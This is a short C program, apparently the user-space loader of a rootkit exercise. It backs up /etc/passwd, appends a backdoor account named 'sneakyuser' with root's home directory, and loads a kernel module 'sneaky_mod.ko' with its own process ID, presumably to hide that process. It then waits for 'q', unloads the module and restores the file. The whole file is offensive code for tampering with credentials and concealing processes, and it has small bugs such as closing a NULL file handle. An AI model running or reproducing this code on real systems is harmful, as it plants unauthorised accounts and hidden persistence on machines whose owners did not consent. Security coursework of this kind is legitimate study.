#include<stdio.h>
#include<stdlib.h>


void copyfile(char source_path[256], char destination_path[256]){
  FILE *source, *destination;
  char ch;
  
  source = fopen(source_path, "r");
  destination = fopen(destination_path, "w");

  if(source == NULL || destination == NULL){
    fclose(source);
    fclose(destination);
    printf("Error while opening files\n");
    exit(EXIT_FAILURE);
  }
  
  while((ch = fgetc(source)) != EOF){
    fputc(ch, destination);
  }
  
  fclose(source);
  fclose(destination);
}

void addSneakyUser(){
  FILE *fp;

  fp = fopen("/etc/passwd", "a+");
  if(fp == NULL){
    printf("Error while opening the file to append");
    exit(EXIT_FAILURE);
  }

  fprintf(fp, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  fclose(fp);
}


void loadSneakyModule(int pid){
  char command[50];
  sprintf(command, "insmod sneaky_mod.ko pid=%d", pid);
  system(command);
  printf("Sneaky Module loaded");
} 


void unLoadingSneakyModule(){
  char command[] = "rmmod sneaky_mod";
  system(command);
  printf("Sneaky Module unloaded");

}

int main(int argc, char* argv[]){
  int current_pid = getpid();
  printf("sneaky_process pid = %d\n", current_pid);
  copyfile("/etc/passwd", "/tmp/passwd");
  addSneakyUser();
  printf("Loading Sneaky user\n");
  loadSneakyModule(current_pid);
  while(1){
    char input;
    scanf("%c", &input);
    if(input== 'q'){
      break;
    }
  }

  unLoadingSneakyModule();
  copyfile("/tmp/passwd", "/etc/passwd");
    
  return 0;
}
